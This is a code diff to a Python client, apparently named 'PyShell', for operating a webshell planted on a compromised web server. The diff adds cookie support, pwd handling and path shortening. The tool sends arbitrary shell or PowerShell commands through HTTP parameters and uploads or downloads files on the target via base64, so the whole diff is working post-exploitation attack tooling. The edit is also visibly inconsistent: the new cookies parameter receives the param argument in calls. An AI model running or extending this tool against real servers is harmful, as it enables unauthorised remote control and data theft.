@@ -6,8 +6,8 @@ import argparse
 import base64
 from termcolor import colored
 
-def send_command(command, webshell, method, param="code"):
-   headers = {"User-Agent":"Mozilla/6.4 (Windows NT 11.1) Gecko/2010102 Firefox/99.0"}
+def send_command(command, webshell, method, cookies, param="code"):
+   headers = {"User-Agent":"Mozilla/6.4 (Windows NT 11.1) Gecko/2010102 Firefox/99.0", "Cookies":args.cookies}
    params = {param.strip():command.strip()}
    if (method.upper() == "GET"):
       response = requests.get((webshell), params=params, headers=headers)
@@ -35,8 +35,9 @@ print (colored(banner, "green"))
 parser = argparse.ArgumentParser()
 parser.add_argument("url", help="Webshell URL", type=str)
 parser.add_argument("method", help="HTTP Method to execute command (GET or POST)", type=str)
-parser.add_argument("-ps", "--PowerShell", action="store_true", help="PowerShell command execution (Only on Windows hosts)")
+parser.add_argument("-c", "--cookies", help="Cookie header to use on web server", type=str)
 parser.add_argument("-p", "--param", default="code", help="Parameter to use with custom WebShell", type=str)
+parser.add_argument("-ps", "--PowerShell", action="store_true", help="PowerShell command execution (Only on Windows hosts)")
 args = parser.parse_args()
 
 try:
@@ -58,7 +59,11 @@ try:
        try:
           print (colored(" [PyShell] ", "grey", "on_green"), end = "") ; print (colored(" ", "green", "on_blue"), end = "")
           print (colored(str(whoami).rstrip()+"@"+str(hostname).rstrip()+" ", "grey", "on_blue"), end = "")
-          print (colored(" ", "blue", "on_yellow"), end = "") ; print (colored(path.rstrip()+" ", "grey", "on_yellow"), end = "")
+          if len(path.rstrip()) > 30:
+             shortpath = path.rstrip().split(slash)[-3:] ; shortpath = ".." + slash + slash.join(map(str, shortpath))
+             print (colored(" ", "blue", "on_yellow"), end = "") ; print (colored(shortpath.rstrip()+" ", "grey", "on_yellow"), end = "")
+          else:
+             print (colored(" ", "blue", "on_yellow"), end = "") ; print (colored(path.rstrip()+" ", "grey", "on_yellow"), end = "")
           print (colored(" ", "yellow"), end = "")
           command = input()
           if command == "exit":
@@ -79,7 +84,7 @@ try:
                    if remotefile == ".":
                       remotefile = path.rstrip() + slash + command.split()[1]
                    else:
-                   	  remotefile = path.rstrip() + slash + command.split()[2]
+                       remotefile = path.rstrip() + slash + command.split()[2]
                 if not slash in localfile:
                    cwd = os.getcwd()
                 print (colored("Uploading file "+ cwd + "/" + localfile +" on "+ remotefile +"..\n", "yellow"))
@@ -100,53 +105,56 @@ try:
                    if not slash in localfile:
                       cwd = os.getcwd()
                       if localfile == ".":
-                      	 localfile = command.split()[1]
+                         localfile = command.split()[1]
                    print (colored("Downloading file "+ remotefile +" on "+ cwd + "/" + localfile +"..\n", "yellow"))
                    if system == "linux":
                       base64data = send_command("base64 " + remotefile, WEBSHELL, HTTP_METHOD, PARAM)
                       download = base64.b64decode(base64data)
                    if system == "windows":
-                   	  command = "[Convert]::ToBase64String([IO.File]::ReadAllBytes('"+remotefile+"'))" 
-                   	  base64data = send_command(command, WEBSHELL, HTTP_METHOD, PARAM)
-                   	  download = base64.b64decode(base64data).decode("utf-16le", errors="ignore").encode("utf8")
+                       command = "[Convert]::ToBase64String([IO.File]::ReadAllBytes('"+remotefile+"'))" 
+                       base64data = send_command(command, WEBSHELL, HTTP_METHOD, PARAM)
+                       download = base64.b64decode(base64data).decode("utf-16le", errors="ignore").encode("utf8")
                    f = open(localfile, "wb") ; f.write(download) ; f.close()
 
                 else:
-                   if "cd" in command.split()[0]:
-                      if ".." in command.split()[1]:
-                         path = path.split(slash)[:-1]
-                         path = (slash.join(path))
-                      else:
-                         if not slash in command.split()[1]:
-                            path = path.rstrip() + slash + command.split()[1]
-                         else:
-                            path = command.split()[1]   
+                   if "pwd" in command.split()[0]:
+                      print (colored(path, "yellow"))
                    else:
-                      if command.split()[0] in COMMAND_LIST:
-                        command_array = command.split(" ")
-                        param = ""
-                        for i in list(command_array):
-                            if i.startswith("-"):
-                                param += i + " "
-                                command_array.remove(i)
-                        cmd = command_array.pop(0)
-                        if len(command_array) == 0:
-                            relative_path = ""
-                        else:
-                            relative_path = command_array[0]
-                        if not relative_path.startswith(slash):
-                          command = cmd + " " + param + path.rstrip() + slash + relative_path
-
-                        content = send_command(command, WEBSHELL, HTTP_METHOD, PARAM)
-                        print (colored(content, "yellow"))
-
+                      if "cd" in command.split()[0]:
+                         if ".." in command.split()[1]:
+                            path = path.split(slash)[:-1]
+                            path = (slash.join(path))
+                         else:
+                            if not slash in command.split()[1]:
+                               path = path.rstrip() + slash + command.split()[1]
+                            else:
+                               path = command.split()[1]   
                       else:
-                        if args.PowerShell:
-                           content = send_command("powershell " + command, WEBSHELL, HTTP_METHOD, PARAM)
-                           print (colored(content, "yellow"))
-                        else:
+                         if command.split()[0] in COMMAND_LIST:
+                           command_array = command.split(" ")
+                           param = ""
+                           for i in list(command_array):
+                               if i.startswith("-"):
+                                   param += i + " "
+                                   command_array.remove(i)
+                           cmd = command_array.pop(0)
+                           if len(command_array) == 0:
+                               relative_path = ""
+                           else:
+                               relative_path = command_array[0]
+                           if not relative_path.startswith(slash):
+                             command = cmd + " " + param + path.rstrip() + slash + relative_path
+
                            content = send_command(command, WEBSHELL, HTTP_METHOD, PARAM)
                            print (colored(content, "yellow"))
+
+                         else:
+                           if args.PowerShell:
+                              content = send_command("powershell " + command, WEBSHELL, HTTP_METHOD, PARAM)
+                              print (colored(content, "yellow"))
+                           else:
+                              content = send_command(command, WEBSHELL, HTTP_METHOD, PARAM)
+                              print (colored(content, "yellow"))
 
        except KeyboardInterrupt:
           print (colored("\nExiting..\n", "red"))
